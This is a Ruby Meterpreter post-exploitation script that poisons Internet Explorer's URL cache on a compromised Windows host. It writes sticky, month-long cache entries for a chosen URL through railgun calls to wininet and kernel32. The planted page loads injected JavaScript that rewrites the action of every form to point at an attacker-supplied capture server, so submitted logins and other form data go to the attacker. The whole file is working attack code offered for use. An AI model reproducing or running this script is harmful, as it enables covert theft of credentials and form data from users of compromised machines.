#client.core.use("railgun")


class CacheEntry
	attr_accessor :url, :file, :w32_file_handle, :payload, :headers, :verbose, :expire_time_ft, :client, :extension

	@default_headers = "HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n\r\n" + Rex::Text.rand_text_alpha((rand(5)+1))
	def initialize(url, headers=@default_headers, payload=nil, verbose=false, client=nil)
		@url = url
		@headers = headers
		@verbose = verbose
		@payload = payload
		@client	= client

		@extension = File.extname(URI.parse(@url).path)

		if @extension == "" then
			@extension = ".html"
		end
		@extension.slice!(0) 
	end

	def create_cache_entry(url=@url)
		puts "Creating cache entry for #{url}..."

		if not @client
			raise "No meterpreter client specified"
		end

		# Get ST
		puts "Obtaining system time..." if verbose
		system_time_st = client.railgun.kernel32.GetSystemTime(16)
		print_rg "system_time_st: ", system_time_st

		# Parse ST. As all are WORDS, we can use .scan(/.{1,4}/m). For more complex structs, 
		# we would need to convert to a stream and .read(bytes)
		# The 1st .reverse fixes byte ordering, the 2nd puts the args back in original argument order
		system_time_args = system_time_st["lpSystemTime"].reverse.unpack("H*")[0].scan(/.{1,4}/m).reverse

=begin
		typedef struct _SYSTEMTIME {
		  WORD wYear; 
		  WORD wMonth; 
		  WORD wDayOfWeek; 
		  WORD wDay;
		  WORD wHour;
		  WORD wMinute;
		  WORD wSecond;
		  WORD wMilliseconds;
		} SYSTEMTIME; 
=end

		# add 1 to the month, the 2nd WORD in our array.
		puts "Cache entry will expire in 1 month."
		system_time_args[1] = "%04x" % (system_time_args[1].to_i + 1) # use %04x to get leading zeros

		# Put it back together
		expire_time_st = [system_time_args.reverse.join].pack("H*").reverse

		# Convert to FileTime struct
		@expire_time_ft = client.railgun.kernel32.SystemTimeToFileTime(expire_time_st,8)
		print_rg "@expire_time_ft: ", @expire_time_ft
		
		cache_file = client.railgun.wininet.CreateUrlCacheEntryA(url,0,@extension,256,0)
		print_rg "cache_file: ", cache_file
		if cache_file['GetLastError'] == 0 then
			puts "Cache entry created: " + cache_file['lpszFileName']
		else
			raise "Error in creating cache_entry."
		end

		@file = cache_file["lpszFileName"]
	end

	def write_payload(payload=@payload)
		if not @client
			raise "No meterpreter client specified"
		end

		if not @file
			raise "@file object not instantiated."
		end

		puts "Obtaining file handle and writing to file..." if verbose
		file_handle = client.railgun.kernel32.CreateFileA(
						@file,
						"GENERIC_READ | GENERIC_WRITE",
						"FILE_SHARE_READ",
						nil,
						"OPEN_EXISTING",
						0,0)
		print_rg "file_handle: ", file_handle
		@w32_file_handle = file_handle["return"]

		write_file = client.railgun.kernel32.WriteFile(
						@w32_file_handle,
						payload,
						payload.length,
						4,
						nil)
		print_rg "write_file: ", write_file

		if write_file['GetLastError'] == 0 then
			puts "File written." if verbose
		else
			raise "Error in writing to file."
		end

		ret = client.railgun.kernel32.CloseHandle(@w32_file_handle)
		print_rg "CloseHandle ret: ", ret
		if ret['GetLastError'] != 0 then
			raise "Error closing file handle."
		end
	end

	def commit_cache_entry(url=@url, file=@file, expire_time_ft=@expire_time_ft, headers=@headers)
		puts "Commiting written cache entry to IE cache database." if verbose
		ret = client.railgun.wininet.CommitUrlCacheEntryA(
						url,
						file,
						# DWORDS in railgun have to be ruby FixInts, so we jump through some hoops to convert to_i(16)
						expire_time_ft["lpFileTime"][0..3].reverse.unpack("H*")[0].to_i(16),
						expire_time_ft["lpFileTime"][4..7].reverse.unpack("H*")[0].to_i(16),
						# We can set last modified time here if we want, but its not required
						0,#system_time_ft["lpSystemTimeAsFileTime"][0..3].reverse.unpack("H*")[0].to_i(16),
						0,#system_time_ft["lpSystemTimeAsFileTime"][4..7].reverse.unpack("H*")[0].to_i(16),
						"STICKY_CACHE_ENTRY",
						headers,
						headers.length,
						nil,nil)
		print_rg "CommitUrlCacheEntry ret: ", ret
		if ret['GetLastError'] == 0 then
			puts "Cache entry written and commited (#{url})."
		else
			raise "Error commiting cache entry."
		end
	end

	def create_and_commit
		if not (@url && @payload)
			raise "url or payload not yet given)"
		end
		create_cache_entry
		write_payload
		commit_cache_entry
	end

	def print_rg(preface, obj)
		if @verbose or not (obj["GetLastError"] == 0)
			#puts preface + obj["GetLastError"].class.to_s + " " + obj["GetLastError"].to_s
			puts preface + "\t" + obj.to_s
		end		
	end

end

def usage
	puts "Usage goes here."
end

# options
@@exec_opts = Rex::Parser::Arguments.new(
   "-h" => [false, "Help and usage"],
   "-u" => [true, "URL to poison (e.g. http://www.google.com/)"],
	"-c" => [true, "Capture URL"],
	"-v" => [false, "Turn on verbosity"]
)

url = nil
@verbosity = false
capture_server = nil
@@exec_opts.parse(args) { |opt, idx, val|
	#v = val.to_s.strip
	case opt
	when "-h"
		usage
		raise Rex::Script::Completed
	when "-u"
		url = val
	when "-v"
		@verbosity = true
	when "-c"
		capture_server = val
	end
}

def get_stager_javascript(payload)
	stager_js = %Q^function swapOut(content)
{
	var doc=document.open("text/html","replace");
	doc.write(content);
	doc.close();
}

function poisonBody(content)
{
	payload = "#{payload}";
	poisonedContent = content
	
	x = 0;
	while(poisonedContent.indexOf("<form", x) != -1) {
		x = poisonedContent.indexOf("<form", x);
		if(x == -1) return "";
		x = poisonedContent.indexOf("action", x);
		x = poisonedContent.indexOf("=", x);

		y = poisonedContent.indexOf(" ", x+1);
		poisonedContent = poisonedContent.slice(0,x+1) + payload + poisonedContent.slice(y,poisonedContent.length);
	}
	
	return poisonedContent;
} 

function poisonPage(url)
{
	var xhr = createXHR();
	xhr.open("GET", url , false);
	xhr.send(null);
	var newhtml = poisonBody(xhr.responseText);
	return newhtml;
}

function createXHR() 
{
	var request = false;
	try {
		request = new ActiveXObject('Msxml2.XMLHTTP');
	} 
	catch (err2) {
		try {
			request = new ActiveXObject('Microsoft.XMLHTTP');
		} 
		catch (err3) {
			try {
				request = new XMLHttpRequest();
			}	
			catch (err1) {
				request = false;
			}
		}
	}
	return request;
}^
end

def get_default_html(js_name)
	html_write = %Q^
<HTML>
<HEAD><SCRIPT SRC=#{js_name}></SCRIPT></HEAD>
<BODY>
<SCRIPT DEFER>
var newpage = poisonPage(document.location + "?");
swapOut(newpage);
</SCRIPT>
</BODY>
</HTML>^
end

# Main Flow of Execution


uri = URI.parse(url)
stager_js_name = uri.scheme + "://" + uri.host + "/" + Rex::Text.rand_text_alpha((rand(10)+2)) + ".js"
ext = File.extname(uri.path)

if ext == "" then
	ext = "htm"
end

js = CacheEntry.new(stager_js_name,
							"HTTP/1.0 200 OK\r\nContent-Type: text/javascript\r\nCache-Control: max-age=#{(60*60*24*30).to_s}\r\n\r\n" + \
								Rex::Text.rand_text_alpha((rand(5)+1)),
							get_stager_javascript(capture_server),
							@verbosity,
							client)


html = CacheEntry.new(url,
							"HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nCache-Control: max-age=#{(60*60*24*30).to_s}\r\n\r\n" + \
								Rex::Text.rand_text_alpha((rand(5)+1)),
							get_default_html(stager_js_name),
							@verbosity,
							client)

js.create_and_commit
html.create_and_commit
